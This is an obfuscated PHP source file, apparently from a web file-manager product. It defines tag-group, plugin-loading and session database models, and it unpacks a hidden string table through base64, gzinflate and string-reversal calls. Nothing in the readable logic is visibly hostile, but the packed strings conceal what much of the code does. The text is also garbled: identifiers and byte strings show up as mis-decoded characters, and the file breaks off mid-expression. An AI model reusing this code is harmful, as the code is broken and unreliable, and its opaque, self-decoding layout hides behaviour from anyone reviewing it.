<?php
 goto E©å»Îéêî; cÁ≠ÿ¿ûò: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($CŸ–èıƒÔ≤) { $bıç∏ñöã∑ =& $_SERVER[’ÿƒ†ïò]; return array($bıç∏ñöã∑[1831] => array($CŸ–èıƒÔ≤[0], $bıç∏ñöã∑[1832]), $bıç∏ñöã∑[1833] => array($CŸ–èıƒÔ≤[0], $bıç∏ñöã∑[1834])); } protected function get($b»›ì¡Üè´) { $dêıèÖ§Ü’ =& $_SERVER[’ÿƒ†ïò]; $f€ôáÚ‡ﬂé = Model($dêıèÖ§Ü’[516])->metaGet($b»›ì¡Üè´, $dêıèÖ§Ü’[1835]); $AÏ°∑ﬂ’ﬂƒ = json_decode($f€ôáÚ‡ﬂé, !0); return $AÏ°∑ﬂ’ﬂƒ ? $AÏ°∑ﬂ’ﬂƒ : array($dêıèÖ§Ü’[1836] => $dêıèÖ§Ü’[87], $dêıèÖ§Ü’[367] => array()); } protected function set($Fúõå¥πΩÑ, $c¡÷˜Üƒ™¥) { $cè∂ÌÌèÍ˘ =& $_SERVER[’ÿƒ†ïò]; $c¡÷˜Üƒ™¥ = $c¡÷˜Üƒ™¥ ? $c¡÷˜Üƒ™¥ : array($cè∂ÌÌèÍ˘[1836] => $cè∂ÌÌèÍ˘[87], $cè∂ÌÌèÍ˘[367] => array()); Model($cè∂ÌÌèÍ˘[516])->metaSet($Fúõå¥πΩÑ, $cè∂ÌÌèÍ˘[1835], json_encode($c¡÷˜Üƒ™¥)); return Model($cè∂ÌÌèÍ˘[516])->metaSet($Fúõå¥πΩÑ, $cè∂ÌÌèÍ˘[1835], json_encode($c¡÷˜Üƒ™¥)); } protected function getByTagID($E∏äÈèü‡ü, $Eôé∑∆ÀË¨) { goto dë˘ˆÂÑç√; E√ÚóÜÀ∫”: $a∫Ü©úπÔŒ = $this->get($E∏äÈèü‡ü); if (!$a∫Ü©úπÔŒ || !isset($a∫Ü©úπÔŒ[$aªËàÉ®ã¡[367]])) { return !1; } $cœÇî◊µÎ = array_find_by_field($a∫Ü©úπÔŒ[$aªËàÉ®ã¡[367]], $aªËàÉ®ã¡[395], $Eôé∑∆ÀË¨); goto aíŒÈ∏‹Ù¯; aíŒÈ∏‹Ù¯: return is_array($cœÇî◊µÎ) ? $cœÇî◊µÎ : !1; goto F«≤Êù∫ã; dë˘ˆÂÑç√: $aªËàÉ®ã¡ =& $_SERVER[’ÿƒ†ïò]; if (!$E∏äÈèü‡ü || !$Eôé∑∆ÀË¨) { return !1; } if (!Model($aªËàÉ®ã¡[516])->getInfoSimple($E∏äÈèü‡ü)) { return !1; } goto E√ÚóÜÀ∫”; F«≤Êù∫ã: } public function listSource($BãÓ†èà»’, $bÎƒêåèç) { goto eıúÿﬂ≈Œ∞; fºïúª°øù: $a«Ÿ·ﬁ‰Ê⁄ = Model($E—û‹ƒ®Í¢[1234])->listSource($A¿çﬂîÂÎ∆); if (!$a«Ÿ·ﬁ‰Ê⁄ || count($d∂∂π™Û∏√) == $a«Ÿ·ﬁ‰Ê⁄[$E—û‹ƒ®Í¢[364]][$E—û‹ƒ®Í¢[365]]) { return $a«Ÿ·ﬁ‰Ê⁄; } $Eﬂœà£àãƒ = array(); goto B∑äÙ…Ñ¢; eıúÿﬂ≈Œ∞: $E—û‹ƒ®Í¢ =& $_SERVER[’ÿƒ†ïò]; if ($bÎƒêåèç && !is_array($bÎƒêåèç)) { $bÎƒêåèç = array($bÎƒêåèç); } $F∞ˆµ§¬∏í = $this->listData($BãÓ†èà»’); goto cÃÑã´Ÿì‚; A∑óêÔÖâú: foreach ($d∂∂π™Û∏√ as $E«‹¨Œúœ∑) { if (!in_array($E«‹¨Œúœ∑, $b‘û≈ƒÌäé)) { $Eﬂœà£àãƒ[] = $E«‹¨Œúœ∑; } } if ($Eﬂœà£àãƒ) { $this->removeBySource($BãÓ†èà»’, $Eﬂœà£àãƒ); } return $a«Ÿ·ﬁ‰Ê⁄; goto C∆ˆ·≈ÂÓ‹; B∑äÙ…Ñ¢: $fˆ»•Î‹≠‚ = array_to_keyvalue($a«Ÿ·ﬁ‰Ê⁄[$E—û‹ƒ®Í¢[75]], $E—û‹ƒ®Í¢[33], $E—û‹ƒ®Í¢[397]); $AˆÕáÂÙ…¬ = array_to_keyvalue($a«Ÿ·ﬁ‰Ê⁄[$E—û‹ƒ®Í¢[74]], $E—û‹ƒ®Í¢[33], $E—û‹ƒ®Í¢[397]); $b‘û≈ƒÌäé = array_merge($AˆÕáÂÙ…¬, $fˆ»•Î‹≠‚); goto A∑óêÔÖâú; aÓﬁ÷Œàà: foreach ($BòŒ»èË÷„ as $D⁄œíıÃ„è => $cáá∫á»œí) { $b¢ÆÈÔÜã◊ = !0; if (!$bÎƒêåèç) { $d∂∂π™Û∏√[] = $D⁄œíıÃ„è; continue; } foreach ($bÎƒêåèç as $e©´πûÓ£í) { if (!in_array($e©´πûÓ£í, $cáá∫á»œí)) { $b¢ÆÈÔÜã◊ = !1; break; } } if ($b¢ÆÈÔÜã◊) { $d∂∂π™Û∏√[] = $D⁄œíıÃ„è; } } if (!$d∂∂π™Û∏√) { return array(); } $A¿çﬂîÂÎ∆ = array($E—û‹ƒ®Í¢[412] => array($E—û‹ƒ®Í¢[413], $d∂∂π™Û∏√), $E—û‹ƒ®Í¢[498] => $BãÓ†èà»’, $E—û‹ƒ®Í¢[406] => SourceModel::TYPE_GROUP); goto fºïúª°øù; cÃÑã´Ÿì‚: $BòŒ»èË÷„ = array(); foreach ($F∞ˆµ§¬∏í as $fÊ≤òœ∫Öù) { $E«‹¨Œúœ∑ = $fÊ≤òœ∫Öù[$E—û‹ƒ®Í¢[76]]; if (!$E«‹¨Œúœ∑) { continue; } if (!isset($BòŒ»èË÷„[$E«‹¨Œúœ∑])) { $BòŒ»èË÷„[$E«‹¨Œúœ∑] = array(); } $BòŒ»èË÷„[$E«‹¨Œúœ∑][] = $fÊ≤òœ∫Öù[$E—û‹ƒ®Í¢[421]]; } $d∂∂π™Û∏√ = array(); goto aÓﬁ÷Œàà; C∆ˆ·≈ÂÓ‹: } protected function listData($b»æß√ÍÒ‚) { $aì»ùƒäıÜ =& $_SERVER[’ÿƒ†ïò]; $bß®∫ù©ò⁄ = array($aì»ùƒäıÜ[1548] => 0, $aì»ùƒäıÜ[477] => array($aì»ùƒäıÜ[1837], 0), $aì»ùƒäıÜ[417] => $aì»ùƒäıÜ[1838] . $b»æß√ÍÒ‚); $cÕ∏Ö¡∂∑è = $aì»ùƒäıÜ[1839]; $bè…îÜÔŒé = $this->field($cÕ∏Ö¡∂∑è)->where($bß®∫ù©ò⁄)->order($aì»ùƒäıÜ[1840])->select(); return $bè…îÜÔŒé ? $bè…îÜÔŒé : array(); } protected function addToTag($AÆ—ÔÔπ˘Ã, $aîÍìöìÛ‹, $d•∞®£à∂ÿ) { $d’ÈúΩ≥÷Ø =& $_SERVER[’ÿƒ†ïò]; if (!$this->getByTagID($AÆ—ÔÔπ˘Ã, $d•∞®£à∂ÿ) || !$aîÍìöìÛ‹) { return !1; } if (!Model($d’ÈúΩ≥÷Ø[820])->pathInfo($aîÍìöìÛ‹)) { return !1; } $DûÙ‰ç§® = array($d’ÈúΩ≥÷Ø[1548] => 0, $d’ÈúΩ≥÷Ø[477] => $d•∞®£à∂ÿ, $d’ÈúΩ≥÷Ø[416] => $aîÍìöìÛ‹, $d’ÈúΩ≥÷Ø[417] => $d’ÈúΩ≥÷Ø[1841] . $AÆ—ÔÔπ˘Ã, $d’ÈúΩ≥÷Ø[415] => $d’ÈúΩ≥÷Ø[33], $d’ÈúΩ≥÷Ø[1730] => 0); if ($this->where($DûÙ‰ç§®)->find()) { return !1; } return $this->add($DûÙ‰ç§®); } protected function removeFromTag($F£íµˆ∂ÕÁ, $DéÑ‡éˆ«·, $dÙµŒå’Í¡) { $aÎôéÖ°ï =& $_SERVER[’ÿƒ†ïò]; if (!$this->getByTagID($F£íµˆ∂ÕÁ, $dÙµŒå’Í¡) || !$DéÑ‡éˆ«·) { return !1; } if (is_array($DéÑ‡éˆ«·)) { $DéÑ‡éˆ«· = array($aÎôéÖ°ï[7], $DéÑ‡éˆ«·); } $E’ﬂπ√√Çá = array($aÎôéÖ°ï[1548] => 0, $aÎôéÖ°ï[477] => $dÙµŒå’Í¡, $aÎôéÖ°ï[417] => $aÎôéÖ°ï[1841] . $F£íµˆ∂ÕÁ, $aÎôéÖ°ï[416] => $DéÑ‡éˆ«·); return $this->where($E’ﬂπ√√Çá)->delete(); } protected function removeByTag($C”ë†‚õÛ, $BøèÜ±ùâº) { $b√µú¬˜Òƒ =& $_SERVER[’ÿƒ†ïò]; if (!$this->getByTagID($C”ë†‚õÛ, $BøèÜ±ùâº)) { return !1; } $Añê–ﬂÍÖª = array($b√µú¬˜Òƒ[1548] => 0, $b√µú¬˜Òƒ[477] => $BøèÜ±ùâº, $b√µú¬˜Òƒ[417] => $b√µú¬˜Òƒ[1841] . $C”ë†‚õÛ); return $this->where($Añê–ﬂÍÖª)->delete(); } protected function removeBySource($C∑Íã‹¿”Ï, $d•¥‡Ô§À) { $B÷Ó™ïŸÒÜ =& $_SERVER[’ÿƒ†ïò]; if (!$C∑Íã‹¿”Ï || !$d•¥‡Ô§À) { return !1; } if (is_array($d•¥‡Ô§À)) { $d•¥‡Ô§À = array($B÷Ó™ïŸÒÜ[7], $d•¥‡Ô§À); } $cÓƒœﬂÉÆ™ = array($B÷Ó™ïŸÒÜ[1548] => 0, $B÷Ó™ïŸÒÜ[416] => $d•¥‡Ô§À, $B÷Ó™ïŸÒÜ[477] => array($B÷Ó™ïŸÒÜ[1001], 0), $B÷Ó™ïŸÒÜ[417] => $B÷Ó™ïŸÒÜ[1841] . $C∑Íã‹¿”Ï); return $this->where($cÓƒœﬂÉÆ™)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\160\154\165\147\x69\156\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\x61\x74\165\163", "\x72\x65\x67\x69\145\x73\x74", "\143\x6f\x6e\146\x69\x67"); public function loadList($E¶†”Û∂ÖÙ = false) { $Cï∫Öäï◊ = array_to_keyvalue($this->listData(), $_SERVER[’ÿƒ†ïò][28]); if ($E¶†”Û∂ÖÙ) { return $Cï∫Öäï◊[$E¶†”Û∂ÖÙ]; } return $Cï∫Öäï◊; } public function init() { $E…–ÿÌ¡ì´ =& $_SERVER[’ÿƒ†ïò]; Hook::trigger($E…–ÿÌ¡ì´[1842]); $b¿Ë—◊◊¬ = $this->loadPluginList(); foreach ($b¿Ë—◊◊¬ as $Aâ«¬ﬁÔèÉ => $EúΩâÚéã©) { $F™Çô®◊‘Ü = $this->appAllow($Aâ«¬ﬁÔèÉ, $EúΩâÚéã©); if (!$F™Çô®◊‘Ü) { continue; } foreach ($EúΩâÚéã©[$E…–ÿÌ¡ì´[1843]] as $a≤ﬁ“—äóƒ => $b»À¬øÜ“Ú) { Hook::bind($a≤ﬁ“—äóƒ, $b»À¬øÜ“Ú); } } Hook::trigger($E…–ÿÌ¡ì´[1844]); Hook::trigger(ACTION); } public function appAllow($CÃ∑Ÿ¶åΩ, $CÉŸÇÁ∂≤, $A–ÑÆ…ÑÊ‹ = true) { $aÉäﬂ‘’è¥ =& $_SERVER[’ÿƒ†ïò]; $D•Îá–‰á£ = PLUGIN_DIR . $CÃ∑Ÿ¶åΩ . $aÉäﬂ‘’è¥[1845]; if (!is_array($CÉŸÇÁ∂≤) || !is_array($CÉŸÇÁ∂≤[$aÉäﬂ‘’è¥[1843]]) || $CÉŸÇÁ∂≤[$aÉäﬂ‘’è¥[738]] != 1 || !is_file($D•Îá–‰á£)) { return !1; } if ($GLOBALS[$aÉäﬂ‘’è¥[499]] == 1) { return !0; } if ($A–ÑÆ…ÑÊ‹ && !Action($aÉäﬂ‘’è¥[1846])->checkAuth($CÃ∑Ÿ¶åΩ)) { return !1; } return !0; } public function unInstall($c“‹ëÀ€ﬁ∞) { $B∞ïõ™ôò =& $_SERVER[’ÿƒ†ïò]; $fÓ¬Çπù‡˘ = $this->loadList($c“‹ëÀ€ﬁ∞); if (file_exists(PLUGIN_DIR . $c“‹ëÀ€ﬁ∞)) { Hook::apply($c“‹ëÀ€ﬁ∞ . $B∞ïõ™ôò[1847]); } $this->remove($fÓ¬Çπù‡˘[$B∞ïõ™ôò[395]]); } public function changeStatus($e˜ÎÜùÁÔæ, $B°ÎääÇñ∏) { $B£‘º¯≠°ô =& $_SERVER[’ÿƒ†ïò]; $f…âÿÜˆŒ÷ = $this->loadList($e˜ÎÜùÁÔæ); if ($B°ÎääÇñ∏) { Hook::apply($e˜ÎÜùÁÔæ . $B£‘º¯≠°ô[1848]); } $this->update($f…âÿÜˆŒ÷[$B£‘º¯≠°ô[395]], array($B£‘º¯≠°ô[1849] => $B°ÎääÇñ∏)); } public function appRegist($c√çù„éé‚, $d †≥Ï∂∫Ú) { $cÏ†›ø‘ÿ” =& $_SERVER[’ÿƒ†ïò]; $E™À†æ›ﬁ÷ = $this->loadList($c√çù„éé‚); if ($E™À†æ›ﬁ÷) { $this->update($E™À†æ›ﬁ÷[$cÏ†›ø‘ÿ”[395]], array($cÏ†›ø‘ÿ”[1843] => $d †≥Ï∂∫Ú)); } else { $a°Óè¶€öÈ = array($cÏ†›ø‘ÿ”[28] => $c√çù„éé‚, $cÏ†›ø‘ÿ”[1843] => $d †≥Ï∂∫Ú, $cÏ†›ø‘ÿ”[738] => 0, $cÏ†›ø‘ÿ”[6] => $this->getConfigDefault($c√çù„éé‚)); $this->insert($a°Óè¶€öÈ); } } public function getConfigDefault($cã®ñç÷åú) { $A´”ã°º◊Ù =& $_SERVER[’ÿƒ†ïò]; $BÒ⁄Ê∆É«” = array(); $eºÒ¿øﬁŸ‰ = $this->getPackageJson($cã®ñç÷åú); if (!$eºÒ¿øﬁŸ‰ && is_array($eºÒ¿øﬁŸ‰[$A´”ã°º◊Ù[1850]])) { return $BÒ⁄Ê∆É«”; } foreach ($eºÒ¿øﬁŸ‰[$A´”ã°º◊Ù[1850]] as $bâÈÇÏ¨ã∂ => $BŒ≈á“ãΩÌ) { if (!isset($BŒ≈á“ãΩÌ[$A´”ã°º◊Ù[372]]) || isset($BÒ⁄Ê∆É«”[$bâÈÇÏ¨ã∂])) { continue; } $BÒ⁄Ê∆É«”[$bâÈÇÏ¨ã∂] = $BŒ≈á“ãΩÌ[$A´”ã°º◊Ù[372]]; } return $BÒ⁄Ê∆É«”; } public function getPackageJson($aäß⁄”ñ¶Ù) { return Hook::apply($aäß⁄”ñ¶Ù . $_SERVER[’ÿƒ†ïò][1851]); } public function getConfig($d»ä∫è≥óŒ, $eÑ±ºÜÜ…´ = false) { $D´ùˆêå¯® =& $_SERVER[’ÿƒ†ïò]; $B…ØÉãÿÓè = array(); $FõÁ±Ú™≥à = $this->loadList($d»ä∫è≥óŒ); if ($FõÁ±Ú™≥à && is_array($FõÁ±Ú™≥à[$D´ùˆêå¯®[6]])) { $B…ØÉãÿÓè = $FõÁ±Ú™≥à[$D´ùˆêå¯®[6]]; } if (!$B…ØÉãÿÓè || $eÑ±ºÜÜ…´) { $B…ØÉãÿÓè = $this->getConfigDefault($d»ä∫è≥óŒ); } return $B…ØÉãÿÓè; } public function setConfig($B ÇÛÔûƒ˜, $BÉ‚Ô·ñêê = false) { goto f´ÖŸÑ¶≤¢; A¿≥¿ﬁÈÓ: $this->update($f–ÇäÓœç√[$C’œı·ƒÜŸ[395]], array($C’œı·ƒÜŸ[6] => $E¯òü“¶ÌÜ)); goto AØ“„∑‹ºÿ; E’úÔÔ§⁄´: $E¯òü“¶ÌÜ = $f–ÇäÓœç√[$C’œı·ƒÜŸ[6]]; if ($BÉ‚Ô·ñêê == !1) { $E¯òü“¶ÌÜ = array(); $BÉ‚Ô·ñêê = $this->getConfigDefault($B ÇÛÔûƒ˜); } foreach ($BÉ‚Ô·ñêê as $aç«¨„Üππ => $E±’êƒ¿œ·) { $E¯òü“¶ÌÜ[$aç«¨„Üππ] = is_string($E±’êƒ¿œ·) ? trim($E±’êƒ¿œ·) : $E±’êƒ¿œ·; } goto A¿≥¿ﬁÈÓ; f´ÖŸÑ¶≤¢: $C’œı·ƒÜŸ =& $_SERVER[’ÿƒ†ïò]; $f–ÇäÓœç√ = $this->loadList($B ÇÛÔûƒ˜); if (!$f–ÇäÓœç√) { return !1; } goto E’úÔÔ§⁄´; AØ“„∑‹ºÿ: } public function viewList() { goto bôÜêîé‡È; bôÜêîé‡È: $E¨Ïö‡üé© =& $_SERVER[’ÿƒ†ïò]; $A∏‚©¨¥Ûò = $this->loadList(); $this->pluginScan($A∏‚©¨¥Ûò); goto b“öΩ—Ü¬…; b“öΩ—Ü¬…: $A∏‚©¨¥Ûò = $this->loadPluginList(); $E∏…óã’ô® = array(); foreach ($A∏‚©¨¥Ûò as $EÑä…Õœîà => $cÑõª¢àÂÁ) { unset($cÑõª¢àÂÁ[$E¨Ïö‡üé©[1843]], $cÑõª¢àÂÁ[$E¨Ïö‡üé©[6]]); $f€≈Éµµ·ù = PLUGIN_DIR . $cÑõª¢àÂÁ[$E¨Ïö‡üé©[28]] . $E¨Ïö‡üé©[1845]; if (!is_file($f€≈Éµµ·ù)) { continue; } $D‡É·Úı‰Ω = Hook::apply($cÑõª¢àÂÁ[$E¨Ïö‡üé©[28]] . $E¨Ïö‡üé©[1851]); if (is_array($D‡É·Úı‰Ω)) { $E∏…óã’ô®[$EÑä…Õœîà] = array_merge($cÑõª¢àÂÁ, $D‡É·Úı‰Ω); } } goto a«ëÖÓœ«’; a«ëÖÓœ«’: return $E∏…óã’ô®; goto Cƒ‰®∆®¯„; Cƒ‰®∆®¯„: } private function loadPluginList() { $Bƒò≈∞îãé =& $_SERVER[’ÿƒ†ïò]; $fîà√Æ´«ê = $this->loadList(); if (strtolower(MOD) == $Bƒò≈∞îãé[1852]) { return $fîà√Æ´«ê; } $b—ÿ—à¨à› = Hook::trigger($Bƒò≈∞îãé[1853], $fîà√Æ´«ê); if ($fîà√Æ´«ê && !$b—ÿ—à¨à›) { die; } return $b—ÿ—à¨à› ? $b—ÿ—à¨à› : $fîà√Æ´«ê; } private function pluginScan($c∑º¡øÚÕÂ) { $Dπ´ìµ‚⁄å =& $_SERVER[’ÿƒ†ïò]; recursion_dir(PLUGIN_DIR, $D∞∂≠ø¬Û™, $a∏úƒéÖâµ, 0); foreach ($D∞∂≠ø¬Û™ as $dÚ„—Ú© Ô) { $f°’Òæïï¯ = get_path_this($dÚ„—Ú© Ô); if (isset($c∑º¡øÚÕÂ[$f°’Òæïï¯]) || !file_exists($dÚ„—Ú© Ô . $Dπ´ìµ‚⁄å[1854]) || !file_exists($dÚ„—Ú© Ô . $Dπ´ìµ‚⁄å[1845])) { continue; } Hook::apply($f°’Òæïï¯ . $Dπ´ìµ‚⁄å[1848]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\x5f\163\x65\x73\163\151\x6f\156"; public function get($aâóâÂÕ◊›) { $CÙò„√°›Õ =& $_SERVER[’ÿƒ†ïò]; $c™Ûæê¶Ò“ = $this->where(array($CÙò„√°›Õ[1855] => $aâóâÂÕ◊›))->find(); if (!is_array($c™Ûæê¶Ò“)) { return !1; } return $c™Ûæê¶Ò“[$CÙò„√°›Õ[743]]; } public function set($D¶†ŸÈÇ≠ÿ, $c∏°È√¿äﬂ, $d’ëÛæ¿ñî = 3600) { $DÃñΩ≠óòî =& $_SERVER[’ÿƒ†ïò]; $D‡∫íÑª≤Ì = array($DÃñΩ≠óòî[1855] => $D¶†ŸÈÇ≠ÿ, $DÃñΩ≠óòî[1764] => $c∏°È√¿äﬂ, $DÃñΩ≠óòî[1856] => $d’ëÛæ¿ñî + time()); if (Session::get($DÃñΩ≠óòî[1857])) { $D‡∫íÑª≤Ì[$DÃñΩ≠óòî[1557]] = Session::get($DÃñΩ≠óòî[1857]); } else { $D‡∫íÑª≤Ì[$DÃñΩ≠óòî[1557]] = 0; } if ($this->get($D¶†ŸÈÇ≠ÿ)) { return $this->where(array($DÃñΩ≠óòî[1855] => $D¶†ŸÈÇ≠ÿ))->save($D‡∫íÑª≤Ì); } else { return $this->add($D‡∫íÑª≤Ì, array(), !0); } } public function remove($FüË‹èê¢ƒ) { return $this->where(array($_SERVER[’ÿƒ†ïò][1855] => $FüË‹èê¢ƒ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[’ÿƒ†ïò][1858] . time())->delete(); } } goto b⁄¯óß≈ŒÓ; E©å»Îéêî: if (!function_exists('_kodDe')) { function _kodDe($b◊ˆ≠∂ü≠Ë) { $b◊ˆ≠∂ü≠Ë = base64_decode($b◊ˆ≠∂ü≠Ë); $bò¡≈åôìÿ = strlen($b◊ˆ≠∂ü≠Ë); $fìçŸ≠«â≥ = ''; $FÃ—ÊÇâÜï = ord($b◊ˆ≠∂ü≠Ë[0]) - 30; for ($FƒÁªìºá◊ = 1; $FƒÁªìºá◊ < $bò¡≈åôìÿ; $FƒÁªìºá◊ += 2) { if ($FƒÁªìºá◊ + 1 < $bò¡≈åôìÿ) { $fìçŸ≠«â≥ .= chr(ord($b◊ˆ≠∂ü≠Ë[$FƒÁªìºá◊ + 1]) + $FÃ—ÊÇâÜï); $fìçŸ≠«â≥ .= chr(ord($b◊ˆ≠∂ü≠Ë[$FƒÁªìºá◊]) + $FÃ—ÊÇâÜï); } else { $fìçŸ≠«â≥ .= chr(ord($b◊ˆ≠∂ü≠Ë[$FƒÁªìºá◊]) + $FÃ—ÊÇâÜï); } } return $fìçŸ≠«â≥; } } define("\xd5\xd8\xc4\xa0\x95\x98", "\351\224\343\365\363"); $_SERVER[’ÿƒ†ïò] = explode(base64_decode('fAJ8AXwF'), gzinflate(substr(strrev('H∞…!ì2DÃ…30aòañC‚yZÎ^ÎB©u∞ı’Sú	}≈'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'ã')."\40\274\44\57\311\233\111\362\62\357\275\314\6\150\221\132\53\210\270\41\202\113\335\265\126\300\275\50\270\143\135\320\272\25\244\165\153\205\301\245\132\167\133\367\377\335\357".base64_decode('fS9B/9/v+36/T4G8e+5+7rnnnnvuuefevGXtn9977b9vvbdk/yU/WXLQjfgH/Hs=').base64_decode('wJKf4u9RKw/ZD/13wMoVVVVtE0eO6/j56ns2yLfJG+WVwcD2Z/2H/uX2M3x7b9g=')."\x3e\xb8\xf7\x27\xfb\x6d\x5b\x7a\x89\xa7\x1\x24\xc6\x79\x1b\xf0\x8f\x94\xd7\x4c\x49\x19\x50\xd\xd3\xc0\x80\x84\x96\x4f\xa9\x69\xfc\xad\xe6\xf1\xaf\x1b\xff\x18\xbd\x59\xd5\x54\xf0\x77\xac"."\x23\x18\x89\x85\xbb\x3a\x3b\x7d\xa1\x48\x8c\x94\x28\xc6\xe7\xb4\x24\xf9\x2a\xc8\xba\x9c\x23\x85\x17\x14\xdd\x0\x55\x89\xc5\xc5\xa\x5a\x41\xc9\x5b\x20\x1c\x90\x94\x4d\x39\x2e\x1b\xa4\x24".strrev('ÿGO!"êÔÍ◊…´µù~äXSöàÕ÷SaüBAÙT[÷<E$}:Û"≈ÁÎÎÃSo')."\323\34\361\7\73\60\270\71\330\336\356\217\224\302\103\301\100\240\311\323\74\263\64\246\63\344\151\155\367\110\240\175\131\45\246\346\123\132\225\264\10\307\54\222\306\342\217"."\x16\x55\xc9\x26\xf1\x67\x5e\xa6\xcd\x31\x7\xb\xe4\x2b\xc2\xbe\xc0\x18\xe4\x8b\xd9\x2c\xe\x74\xb0\x2f\xd2\x7e\x25\x25\x17\xb3\x4\x67\x5e\x31\x50\xd0\xd5\x9c\x4c\xbb\x3e\x53\x19\x64\x50"."\374\41\27\115\115\315\47\160\300\67\140\352\62\207\203\26\47\164\45\247\344\111\121\141\137\300\327\34\221\140\63\245\226\120\260\135\42\103\221\223\15\123\321\245\71\155\276".strrev('yiÀñÑßé$ÛMIÎ»`∞¶SŒZrT¡*˚H…ÄÆæpîÆ=D¨oMÇOê').strrev('±)ŒO¨f≤¶J‘®@ô-'."\0".'õù">¬Z[	Ä‡°·'."\n".'’4)ßå(').strrev('ÔÒ”çü√ÎL¿π25˘ëÚI(Ö'."\n".'‘“(˘f∆öIXÑãWöØpÉ5~CÚJﬂ‡ˆ').strrev('∫lUöîô“>µ€°+öÅHÈ]^36P(Gπêg2y™KB|î∆näqÉ(íT')."\245\264\154\122\321\171\270\0\262\213\61\244\127\352\220\220\273\243\230\23\223\260\140\42\243\146\223\72\235\245\77\224\22\360\1\65\65\310\147\243\241\25\365\204\342\7\363"."\205\347\355\144\55\31\117\22\51\246\11\72\155\320\176\165\25\262\232\234\14\53\272\320\327\26\220\61\130\64\105\140\21\45\153\321\364\234\27\360\15\122\77\230\55\152\127"."\231\210\36\72\137\222\2\12\135\204\337\125\315\137\346\374\156\301\374\323\301\77\143\11\363\213\222\246\145\224\154\66\246\14\50\144\136\345\222\365\6\355\253\333\210\253\171"."\x37\x80\xe0\xa0\x3f\x18\xcb\xc8\x46\xa6\x3d\x59\x1f\x43\xb9\x28\x4f\x4d\x2a\x3\xae\x42\xa6\x40\xa6\x3e\x9b\xed\x51\xb\xdd\xc3\xd1\xe9\xd0\x4c\x9f\xc0\x99\xb3\x5a\x42\xce\x8a\x3d\xc5\xdf"."\31\323\54\204\225\174\22\42\204\364\110\353\317\43\204\25\24\205\44\362\72\244\244\324\56\315\223\332\32\324\6\203\146\314\145\331\27\355\35\203\31\14\150\16\20\212\251".base64_decode('IGFlwCRIkaYmMrIOhquxaKackwl/KRSyakI2VS3v1hKmYjoNU1dkUponkVAMw9k=')."\254\345\115\135\313\72\75\331\254\326\357\14\352\152\132\315\67\110\325\204\33\203\110\60\337\235\220\103\66\220\111\134\61\125\202\264\2\31\104\65\256\215\116\116\226\132\227"."\363\106\112\321\235\76\62\151\32\44\60\36\214\101\322\144\136\325\50\150\206\12\233\327\40\311\246\51\47\62\220\271\360\342\33\177\40\275\232\317\252\171\245\44\255\157\240"."\240\352\212\101\333\52\265\266\107\110\41\240\164\305\331\251\313\351\234\334\40\25\212\161\200\31\62\173\313\300\160\152\202\232\6\51\1\203\16\51\127\64\114\247\256\0\56".base64_decode('pYL1kIyxP+Vsh1NLVZLOMGDmBDyhpk4CZCPROAxti0Q6Y/4WsGZ3+GLtnkhzG2k=').base64_decode('timnaZsDgEWzIilwrhNMMUhYHaCvHNip9Ss6qLhpsEHq0ZJxbcBFo2DiMOAhNDE=')."\x1c\xee\x82\xe9\xc\xc9\xf9\x34\xc4\x4f\x7c\xd0\x54\x8\xf9\x19\x7d\x69\x2b\xa2\x3\x4a\x3e\x6d\x66\x68\xc6\xb0\x2f\x34\xdb\x17\x8a\x85\x83\x2d\x91\x39\x9e\x10\x59\xed\xf3\x80\x4a\x6\x68".strrev('›∂9®ÀELSë u„'."\n".'ﬂ¿\\hY8X—X‡18h÷ \'Õ&Í$§3¨Ë∞U')."\144\61\10\223\100\24\150\45\15\162\243\16\65\106\63\325\125\321\344\270\261\116\360\157\365\330\371\121\257\253\172\301\14\267\312\363\270\307\273\306\113\265\65\23\245\116\40"."\x9b\xa8\x72\x56\x22\x9d\x2e\x49\x51\x23\x5\x67\xfe\x0\x2\xe0\xd2\x25\x4c\x6b\x1b\xea\x30\x30\xe4\x9b\xd5\xe5\xb\x47\x62\xed\xbe\x48\x5b\xd0\x4b\x6a\xf0\x79\xc8\x57\x40\xc3\x53\x93\xf6".base64_decode('aD7+WeDi/BiMuT8np21cGobaNV2xQviqMUdNUjYOg22Kms6Q/qmwtISW1XQ5C7k=').base64_decode('GCVihXKWtJoi44MZJg+E1VyB8jUzU8zFhU8qloLxpstLRmPLm6aTrwY3STimtoU=')."\162\146\167\170\2\370\303\331\160\122\313\311\124\332\105\54\111\111\142\236\204\101\325\226\230\66\105\346\353\245\251\233\32\204\352\226\44\355\212\231\321\310\40\245\25\332\244"."\42\153\33\155\145\122\311\52\24\33\31\205\262\364\32\222\14\254\114\14\127\51\306\336\201\340\6\240\174\111\125\215\20\310\11\5\51\32\236\3\345\135\16\60\131\322\54"."\130\115\202\361\156\60\135\210\44\241\32\55\302\342\37\323\120\34\150\274\314\323\167\352\112\112\45\223\56\17\106\254\135\326\173\150\6\60\102\174\331\201\1\241\260\226\256".strrev('•”ôúY/àïÖj˙C'."\0".'’“å2'."\0".'íq(ãdÓiÊ7èQ•¸ÑÊC'."\0".'àÏ÷ @')."\62\153\374\15\270\163\101\313\33\212\63\101\112\113\162\266\216\123\114\265\361\364\222\34\134\162\37\160\312\271\41\147\16\240\311\311\232\156\135\141\245\210\270\120\373\311\270"."\x72\xf6\xd\x11\xb\x36\x46\x74\x69\xef\xc\x86\x49\x86\x19\x10\xa\xa4\xa7\xb8\xa2\x93\x76\x74\x76\x91\xa8\x9c\x40\x53\xad\x3e\x2\x1c\x49\x57\x6b\x99\xc8\x4e\x9e\x39\x61\xca\x7a\x8b\x20"."\275\256\16\311\274\217\63\150\173\110\331\3\271\54\27\10\255\275\162\362\261\210\264\371\73\146\306\332\203\136\137\40\346\357\0\174\51\122\12\357\352\364\172\350\340\212\360"."\246\140\244\315\2\355\2\234\151\266\47\340\267\47\367\315\365\207\43\341\262\121\0\326\345\263\305\200\275\140\147\310\327\342\237\313\202\55\176\137\300\33\216\65\173\232\333".base64_decode('eJoOTzsJxFJwN2a4reljgMWG2Z4u1gf3pxRZMcsGKka3BjFOB2C5VAjtke7CXTE=')."\352\11\221\321\23\132\221\122\43\23\23\163\224\253\344\144\62\255\144\272\24\126\341\237\261\222\47\54\231\205\30